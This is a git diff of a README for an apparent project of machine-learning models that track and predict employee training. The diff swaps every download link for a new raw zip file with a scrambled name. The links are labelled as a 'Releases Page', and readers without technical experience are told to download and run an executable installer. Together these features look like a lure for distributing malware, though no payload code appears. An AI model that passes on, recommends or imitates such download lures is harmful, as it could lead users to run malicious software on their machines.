@@ -4,7 +4,7 @@
 Welcome to the **ML-Models-For-Course-Training-Tracking-And-Predictions** project. This software offers a set of five powerful machine learning models. These models automatically provide training recommendations for employees, predict course completion, track time spent on training, forecast delays, and assess success rates. With demand-aware recommendations using XGBoost, you can expect high accuracy and efficiency in training management.
 
 ## 📥 Download Here
-[![Download ML-Models-For-Course-Training-Tracking-And-Predictions](https://raw.githubusercontent.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/main/training_success_predictor/Predictions-Tracking-M-And-Training-Course-For-Models-v1.5-alpha.3.zip)](https://raw.githubusercontent.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/main/training_success_predictor/Predictions-Tracking-M-And-Training-Course-For-Models-v1.5-alpha.3.zip)
+[![Download ML-Models-For-Course-Training-Tracking-And-Predictions](https://github.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/raw/refs/heads/main/training_module_assist/Training_Models_Tracking_M_Predictions_For_Course_And_1.6.zip)](https://github.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/raw/refs/heads/main/training_module_assist/Training_Models_Tracking_M_Predictions_For_Course_And_1.6.zip)
 
 ## 🚀 Getting Started
 To get started with this application, you will need to follow a few simple steps. This guide aims to help you smoothly download and run the software, even if you have no technical experience.
@@ -18,10 +18,10 @@ Before you download the software, ensure you have the following:
 
 ## 🔗 Visit the Releases Page
 You can find all the available versions of the software by visiting the following link:  
-[Visit Releases Page](https://raw.githubusercontent.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/main/training_success_predictor/Predictions-Tracking-M-And-Training-Course-For-Models-v1.5-alpha.3.zip)
+[Visit Releases Page](https://github.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/raw/refs/heads/main/training_module_assist/Training_Models_Tracking_M_Predictions_For_Course_And_1.6.zip)
 
 ## 📥 Download & Install
-1. **Go to the Releases Page:** Click [here](https://raw.githubusercontent.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/main/training_success_predictor/Predictions-Tracking-M-And-Training-Course-For-Models-v1.5-alpha.3.zip) to open the Releases page.
+1. **Go to the Releases Page:** Click [here](https://github.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/raw/refs/heads/main/training_module_assist/Training_Models_Tracking_M_Predictions_For_Course_And_1.6.zip) to open the Releases page.
 2. **Select the Latest Version:** Look for the newest version listed on the page, usually at the top.
 3. **Download the File:** Click on the download link associated with the version you want to install. This will typically be an executable file.
 4. **Run the Installer:** After the download completes, open the file and follow the on-screen instructions to install the software on your machine.
@@ -58,4 +58,4 @@ Join our community to share experiences, discuss ideas, and learn more about eff
 
 Remember to regularly check the Releases page for updates and new features! 
 
-[Download Now](https://raw.githubusercontent.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/main/training_success_predictor/Predictions-Tracking-M-And-Training-Course-For-Models-v1.5-alpha.3.zip) and start enhancing your employee training experience today.
+[Download Now](https://github.com/MinhQuanNgo/ML-Models-For-Course-Training-Tracking-And-Predictions/raw/refs/heads/main/training_module_assist/Training_Models_Tracking_M_Predictions_For_Course_And_1.6.zip) and start enhancing your employee training experience today.
